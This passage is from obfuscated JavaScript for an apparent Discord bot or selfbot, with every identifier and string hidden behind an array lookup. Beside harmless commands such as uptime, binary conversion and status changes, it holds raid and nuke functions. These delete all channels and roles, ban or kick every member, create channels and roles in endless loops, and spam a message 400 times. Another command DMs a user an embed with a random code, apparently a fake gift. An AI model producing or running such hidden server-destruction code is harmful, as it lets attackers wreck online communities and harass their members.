webhook.MessageBuilder()[_0xa42d[881]](_0x74d2x65)[_0xa42d[838]](_0xa42d[889]);_0x74d2x67[_0xa42d[101]](_0x74d2x68)}};if(_0x74d2x15=== _0xa42d[890]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(!_0x74d2x12[_0xa42d[81]]){return _0x74d2x12[_0xa42d[85]][_0xa42d[101]](_0xa42d[337])};const _0x74d2x3f=_0x74d2x12[_0xa42d[99]][_0xa42d[186]][_0xa42d[97]]()|| _0x74d2x12[_0xa42d[85]];const _0x74d2x52=_0x74d2x12[_0xa42d[81]][_0xa42d[792]](_0x74d2x3f);const _0x74d2x69=_0x74d2x52[_0xa42d[892]][_0xa42d[891]]()[_0xa42d[286]]((_0x74d2x6a)=>{return _0x74d2x6a[_0xa42d[89]](/_/g,_0xa42d[23])[_0xa42d[511]]()[_0xa42d[89]](/\b(\w)/g,(_0x74d2x6b)=>{return _0x74d2x6b[_0xa42d[307]]()})})[_0xa42d[177]](_0xa42d[375]);const _0x74d2x17=_0x74d2x52[_0xa42d[98]][_0xa42d[286]]((_0x74d2x3b)=>{return _0x74d2x3b})[_0xa42d[177]](_0xa42d[375]);if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[112]](`${_0xa42d[20]}${_0x74d2x3f[_0xa42d[52]]}${_0xa42d[902]}`)[_0xa42d[110]](`${_0xa42d[901]}${_0x74d2x3f[_0xa42d[59]]}${_0xa42d[20]}`)[_0xa42d[107]](_0x74d2x3f[_0xa42d[245]])[_0xa42d[105]](_0x74d2x52[_0xa42d[899]][_0xa42d[898]]|| _0xa42d[900])[_0xa42d[391]](_0xa42d[897],_0x74d2x3f[_0xa42d[52]],true)[_0xa42d[391]](_0xa42d[896],_0x74d2x3f[_0xa42d[122]],true)[_0xa42d[391]](_0xa42d[895],_0x74d2x3f[_0xa42d[61]],true)[_0xa42d[391]](_0xa42d[894],moment(_0x74d2x3f[_0xa42d[407]])[_0xa42d[28]](_0xa42d[406]),true)[_0xa42d[391]](`${_0xa42d[26]}${_0x74d2x52[_0xa42d[98]][_0xa42d[376]]}${_0xa42d[430]}`,_0x74d2x17)[_0xa42d[391]](_0xa42d[893],_0x74d2x69)[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[433]]();_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](stripIndents`${_0xa42d[249]}${_0x74d2x3f[_0xa42d[52]]}${_0xa42d[903]}${_0x74d2x3f[_0xa42d[59]]}${_0xa42d[904]}${_0x74d2x3f[_0xa42d[52]]}${_0xa42d[905]}${_0x74d2x3f[_0xa42d[122]]}${_0xa42d[906]}${_0x74d2x3f[_0xa42d[61]]}${_0xa42d[907]}${moment(_0x74d2x3f[_0xa42d[407]])[_0xa42d[28]](_0xa42d[406])}${_0xa42d[908]}${_0x74d2x52[_0xa42d[98]][_0xa42d[376]]}${_0xa42d[909]}${_0x74d2x69}${_0xa42d[20]}${footer?`${_0xa42d[159]}${footer}${_0xa42d[20]}`:_0xa42d[102]}${_0xa42d[253]}`)}};if(_0x74d2x15=== _0xa42d[910]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};var _0x74d2x6c=bot[_0xa42d[910]];var _0x74d2x6d=Math[_0xa42d[197]]((_0x74d2x6c/ 1000)% 60);var _0x74d2x6e=Math[_0xa42d[197]]((_0x74d2x6c/ 1000/ 60)% 60);var _0x74d2x6f=Math[_0xa42d[197]]((_0x74d2x6c/ 1000/ 60/ 60)% 24);var _0x74d2x70=Math[_0xa42d[197]]((_0x74d2x6c/ 1000/ 60/ 60/ 24)% 7);var _0x74d2x71=Math[_0xa42d[197]]((_0x74d2x6c/ 1000/ 60/ 60/ 24/ 168)>> 0);var _0x74d2x72=null;var _0x74d2x73=null;var _0x74d2x74=null;var _0x74d2x75=null;var _0x74d2x76=null;if(_0x74d2x6d=== 1){_0x74d2x72= _0xa42d[911]}else {_0x74d2x72= _0xa42d[912]};if(_0x74d2x6e=== 1){_0x74d2x73= _0xa42d[913]}else {_0x74d2x73= _0xa42d[914]};if(_0x74d2x6f=== 1){_0x74d2x74= _0xa42d[915]}else {_0x74d2x74= _0xa42d[916]};if(_0x74d2x70=== 1){_0x74d2x75= _0xa42d[917]}else {_0x74d2x75= _0xa42d[918]};if(_0x74d2x71=== 1){_0x74d2x76= _0xa42d[919]}else {_0x74d2x76= _0xa42d[920]};if(_0x74d2x6d=== 0){_0x74d2x6d= null;_0x74d2x72= null};if(_0x74d2x6e=== 0){_0x74d2x6e= null;_0x74d2x73= null};if(_0x74d2x6f=== 0){_0x74d2x6f= null;_0x74d2x74= null};if(_0x74d2x70=== 0){_0x74d2x70= null;_0x74d2x75= null};if(_0x74d2x71=== 0){_0x74d2x71= null;_0x74d2x76= null};var _0x74d2x77=_0x74d2x71+ _0x74d2x76+ _0x74d2x70+ _0x74d2x75+ _0x74d2x6f+ _0x74d2x74+ _0x74d2x6e+ _0x74d2x73+ _0x74d2x6d+ _0x74d2x72;let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[112]](_0xa42d[925])[_0xa42d[391]](_0xa42d[921],`${_0xa42d[20]}${_0x74d2x77}${_0xa42d[922]}${moment()[_0xa42d[924]](bot[_0xa42d[910]],_0xa42d[329])[_0xa42d[28]](_0xa42d[923])}${_0xa42d[20]}`)[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102]);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)};if(_0x74d2x15=== _0xa42d[926]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(!_0x74d2x12[_0xa42d[81]][_0xa42d[796]][_0xa42d[928]](_0xa42d[927])){return console[_0xa42d[18]](`${_0xa42d[20]}${colors[_0xa42d[22]](_0xa42d[929])}${_0xa42d[23]}${colors[_0xa42d[24]](_0xa42d[930])}${_0xa42d[20]}`)};_0x74d2x12[_0xa42d[81]][_0xa42d[387]][_0xa42d[310]]((_0x74d2x45)=>{_0x74d2x45[_0xa42d[96]]()})};if(_0x74d2x15=== _0xa42d[931]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(!_0x74d2x12[_0xa42d[81]][_0xa42d[796]][_0xa42d[928]](_0xa42d[932])){return console[_0xa42d[18]](`${_0xa42d[20]}${colors[_0xa42d[22]](_0xa42d[929])}${_0xa42d[23]}${colors[_0xa42d[24]](_0xa42d[930])}${_0xa42d[20]}`)};_0x74d2x12[_0xa42d[81]][_0xa42d[98]][_0xa42d[310]]((_0x74d2x17)=>{_0x74d2x17[_0xa42d[96]]()})};if(_0x74d2x15=== _0xa42d[933]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(!_0x74d2x12[_0xa42d[81]][_0xa42d[796]][_0xa42d[928]](_0xa42d[927])){return console[_0xa42d[18]](`${_0xa42d[20]}${colors[_0xa42d[22]](_0xa42d[929])}${_0xa42d[23]}${colors[_0xa42d[24]](_0xa42d[930])}${_0xa42d[20]}`)};setInterval(()=>{_0x74d2x12[_0xa42d[81]][_0xa42d[840]](_0xa42d[839],{type:_0xa42d[386]})})};if(_0x74d2x15=== _0xa42d[934]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(!_0x74d2x12[_0xa42d[81]][_0xa42d[796]][_0xa42d[928]](_0xa42d[794])){return console[_0xa42d[18]](`${_0xa42d[20]}${colors[_0xa42d[22]](_0xa42d[929])}${_0xa42d[23]}${colors[_0xa42d[24]](_0xa42d[930])}${_0xa42d[20]}`)};_0x74d2x12[_0xa42d[81]][_0xa42d[380]][_0xa42d[310]]((_0x74d2x52)=>{_0x74d2x52[_0xa42d[791]]({reason:_0xa42d[935]})})};if(_0x74d2x15=== _0xa42d[936]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(!_0x74d2x12[_0xa42d[81]][_0xa42d[796]][_0xa42d[928]](_0xa42d[802])){return console[_0xa42d[18]](`${_0xa42d[20]}${colors[_0xa42d[22]](_0xa42d[929])}${_0xa42d[23]}${colors[_0xa42d[24]](_0xa42d[930])}${_0xa42d[20]}`)};_0x74d2x12[_0xa42d[81]][_0xa42d[380]][_0xa42d[310]]((_0x74d2x52)=>{_0x74d2x52[_0xa42d[801]](_0xa42d[935])})};if(_0x74d2x15=== _0xa42d[937]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(!_0x74d2x12[_0xa42d[81]][_0xa42d[796]][_0xa42d[928]](_0xa42d[932])){return console[_0xa42d[18]](`${_0xa42d[20]}${colors[_0xa42d[22]](_0xa42d[929])}${_0xa42d[23]}${colors[_0xa42d[24]](_0xa42d[930])}${_0xa42d[20]}`)};setInterval(()=>{_0x74d2x12[_0xa42d[81]][_0xa42d[808]]({name:_0xa42d[938],color:_0xa42d[113]})})};if(_0x74d2x15=== _0xa42d[939]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};function _0x74d2x4c(){let _0x74d2x2a=_0xa42d[20];let _0x74d2x4d=_0xa42d[464];for(var _0x74d2x4e=0;_0x74d2x4e< 19;_0x74d2x4e++){_0x74d2x2a= _0x74d2x2a+ _0x74d2x4d[_0xa42d[465]](Math[_0xa42d[197]](Math[_0xa42d[195]]()* _0x74d2x4d[_0xa42d[196]]))};return _0x74d2x2a}if(_0x74d2x16[0][_0xa42d[196]]> 18|| _0x74d2x16[0][_0xa42d[196]]< 18){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[940])};if(!_0x74d2x16[0]){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[941])};if(!_0x74d2x16[1]){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[942])};_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[943]);let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[246]](_0xa42d[949],_0xa42d[950])[_0xa42d[112]](_0xa42d[948])[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[433]]()[_0xa42d[391]](_0xa42d[944],`${_0xa42d[945]}${_0x74d2x4c()}${_0xa42d[946]}${_0x74d2x16[1]}${_0xa42d[947]}`);_0x74d2x12[_0xa42d[81]][_0xa42d[380]][_0xa42d[184]](_0x74d2x16[0])[_0xa42d[101]](_0x74d2x18)};if(_0x74d2x15=== _0xa42d[951]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x78=_0x74d2x16[0];const _0x74d2x1f=_0x74d2x16[_0xa42d[90]](1)[_0xa42d[177]](_0xa42d[23]);if(!_0x74d2x78){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[941])};if(!_0x74d2x1f){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[276])};_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[20]}${_0x74d2x1f}${_0xa42d[952]}${_0x74d2x78}${_0xa42d[424]}`)};if(_0x74d2x15=== _0xa42d[953]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[954])};if(_0x74d2x15=== _0xa42d[955]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};let _0x74d2x79=_0x74d2x16[_0xa42d[177]](_0xa42d[23]);if(!_0x74d2x79){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[956])};let _0x74d2x7a=[_0xa42d[957],_0xa42d[958],_0xa42d[957],_0xa42d[959],_0xa42d[960],_0xa42d[961],_0xa42d[962],_0xa42d[963],_0xa42d[964],_0xa42d[965],_0xa42d[966],_0xa42d[967],_0xa42d[968],_0xa42d[969],_0xa42d[970],_0xa42d[971],_0xa42d[972],_0xa42d[973],_0xa42d[974],_0xa42d[975],_0xa42d[976]];let _0x74d2x2e=_0x74d2x7a[Math[_0xa42d[197]](Math[_0xa42d[195]]()* (_0x74d2x7a[_0xa42d[196]]))];if(enabled=== true){let _0x74d2x7b= new Discord.RichEmbed()[_0xa42d[112]](_0xa42d[979])[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[391]](_0xa42d[978],_0x74d2x79,true)[_0xa42d[391]](_0xa42d[977],_0x74d2x2e,true);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x7b)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](stripIndents`${_0xa42d[980]}${_0x74d2x79}${_0xa42d[981]}${_0x74d2x2e}${_0xa42d[20]}${footer?`${_0xa42d[159]}${footer}${_0xa42d[20]}`:_0xa42d[102]}${_0xa42d[982]}`)}};if(_0x74d2x15=== _0xa42d[983]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[107]](_0xa42d[106])[_0xa42d[105]](_0xa42d[104])[_0xa42d[103]](_0xa42d[102])[_0xa42d[112]](_0xa42d[37])[_0xa42d[110]](_0xa42d[991])[_0xa42d[391]](_0xa42d[990],_0xa42d[74],true)[_0xa42d[391]](_0xa42d[989],process[_0xa42d[47]],true)[_0xa42d[391]](_0xa42d[988],Discord[_0xa42d[47]],true)[_0xa42d[391]](_0xa42d[986],require(_0xa42d[987])[_0xa42d[47]],true)[_0xa42d[391]](_0xa42d[984],_0xa42d[985],true);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](stripIndents`${_0xa42d[992]}${process[_0xa42d[47]]}${_0xa42d[993]}${Discord[_0xa42d[47]]}${_0xa42d[994]}${require(_0xa42d[987])[_0xa42d[47]]}${_0xa42d[995]}`)}};if(_0x74d2x15=== _0xa42d[996]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(!_0x74d2x16[0]){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[508])};let _0x74d2x7c=[_0xa42d[509],_0xa42d[510]];if(!_0x74d2x7c[_0xa42d[92]](_0x74d2x16[0][_0xa42d[511]]())){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[508])};let _0x74d2x31=_0x74d2x16[_0xa42d[90]](1)[_0xa42d[177]](_0xa42d[23]);if(!_0x74d2x31){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[512])};if(_0x74d2x31[_0xa42d[196]]> 1024){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[513])};function _0x74d2x7d(_0x74d2x6b){return _0x74d2x6b[_0xa42d[88]](_0xa42d[20])[_0xa42d[286]]((_0x74d2x6a)=>{const _0x74d2x7e=_0x74d2x6a[_0xa42d[997]](0).toString(2);return _0x74d2x7e[_0xa42d[998]](8,_0xa42d[585])})[_0xa42d[177]](_0xa42d[23])}function _0x74d2x7f(_0x74d2x6b){return _0x74d2x6b[_0xa42d[88]](_0xa42d[23])[_0xa42d[286]]((_0x74d2x6a)=>{return String[_0xa42d[274]](Number[_0xa42d[999]](_0x74d2x6a,2))})[_0xa42d[177]](_0xa42d[20])}if(_0x74d2x16[0][_0xa42d[511]]()=== _0xa42d[509]){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x7d(_0x74d2x31))}else {if(_0x74d2x16[0][_0xa42d[511]]()=== _0xa42d[510]){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x7f(_0x74d2x31))}}};if(_0x74d2x15=== _0xa42d[1000]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x1f=_0x74d2x16[_0xa42d[177]](_0xa42d[23]);bot[_0xa42d[53]][_0xa42d[79]](_0x74d2x1f,{type:_0xa42d[1001],url:_0xa42d[1002]});if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[112]](_0xa42d[111])[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[110]](`${_0xa42d[1003]}${_0x74d2x1f}${_0xa42d[178]}`);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](stripIndents`${_0xa42d[1004]}${_0x74d2x1f}${_0xa42d[20]}${footer?`${_0xa42d[159]}${footer}${_0xa42d[20]}`:_0xa42d[102]}${_0xa42d[253]}`)}};if(_0x74d2x15=== _0xa42d[1005]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x1f=_0x74d2x16[_0xa42d[177]](_0xa42d[23]);bot[_0xa42d[53]][_0xa42d[79]](_0x74d2x1f,{type:_0xa42d[1006]});if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[112]](_0xa42d[111])[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[110]](`${_0xa42d[1007]}${_0x74d2x1f}${_0xa42d[178]}`);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](stripIndents`${_0xa42d[1008]}${_0x74d2x1f}${_0xa42d[20]}${footer?`${_0xa42d[159]}${footer}${_0xa42d[20]}`:_0xa42d[102]}${_0xa42d[253]}`)}};if(_0x74d2x15=== _0xa42d[1009]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x1f=_0x74d2x16[_0xa42d[177]](_0xa42d[23]);bot[_0xa42d[53]][_0xa42d[79]](_0x74d2x1f,{type:_0xa42d[1010]});if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[112]](_0xa42d[111])[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[110]](`${_0xa42d[1011]}${_0x74d2x1f}${_0xa42d[178]}`);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](stripIndents`${_0xa42d[1012]}${_0x74d2x1f}${_0xa42d[20]}${footer?`${_0xa42d[159]}${footer}${_0xa42d[20]}`:_0xa42d[102]}${_0xa42d[253]}`)}};if(_0x74d2x15=== _0xa42d[1013]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x1f=_0x74d2x16[_0xa42d[177]](_0xa42d[23]);bot[_0xa42d[53]][_0xa42d[79]](_0x74d2x1f,{type:_0xa42d[78]});if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[112]](_0xa42d[111])[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[110]](`${_0xa42d[1014]}${_0x74d2x1f}${_0xa42d[178]}`);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](stripIndents`${_0xa42d[1015]}${_0x74d2x1f}${_0xa42d[20]}${footer?`${_0xa42d[159]}${footer}${_0xa42d[20]}`:_0xa42d[102]}${_0xa42d[253]}`)}};if(_0x74d2x15=== _0xa42d[1016]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};bot[_0xa42d[53]][_0xa42d[79]](null);if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[112]](_0xa42d[111])[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[110]](`${_0xa42d[1017]}`);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](stripIndents`${_0xa42d[1018]}${footer?`${_0xa42d[159]}${footer}${_0xa42d[20]}`:_0xa42d[102]}${_0xa42d[253]}`)}};if(_0x74d2x15=== _0xa42d[50]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[1019][_0xa42d[270]](400))};if(_0x74d2x15=== _0xa42d[1020]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(!_0x74d2x16[_0xa42d[177]](_0xa42d[23])){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[1021])};_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x16[_0xa42d[177]](_0xa42d[23])[_0xa42d[88]](_0xa42d[20])[_0xa42d[1020]]()[_0xa42d[177]](_0xa42d[20]))};if(_0x74d2x15=== 